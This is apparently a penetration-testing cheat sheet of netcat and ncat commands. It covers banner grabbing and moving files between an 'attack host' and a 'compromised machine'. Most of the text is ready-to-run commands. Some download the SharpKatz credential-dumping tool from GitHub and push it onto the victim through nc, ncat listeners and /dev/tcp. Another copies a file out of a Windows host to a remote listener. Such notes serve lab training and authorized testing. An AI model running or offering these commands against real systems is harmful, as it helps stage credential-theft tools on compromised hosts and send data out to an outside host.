#### Banner Grabbing
```shell
nc -nv <IP> 21
```
## File Transfer with Netcat and Ncat
#### From Windows to Linux
**Windows**
```cmd
nc64.exe -w 3 10.10.15.11 8000 < file.txt
```
**Linux**
```shell
nc -l -p 8000 > file.txt
```
#### NetCat - Compromised Machine
```shell
nc -l -p 8000 > SharpKatz.exe
```
#### Ncat - Compromised Machine
```shell
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
#### Netcat - Attack Host - Sending File to Compromised machine
```shell
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```shell
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
#### Ncat - Attack Host - Sending File to Compromised machine
```shell
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```shell
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
#### Attack Host - Sending File as Input to Netcat
```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File
```shell
nc 192.168.49.128 443 > SharpKatz.exe
```
#### Attack Host - Sending File as Input to Ncat
```shell
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File
```shell
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
#### NetCat - Sending File as Input to Netcat
```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Ncat - Sending File as Input to Netcat
```shell
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
```shell
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

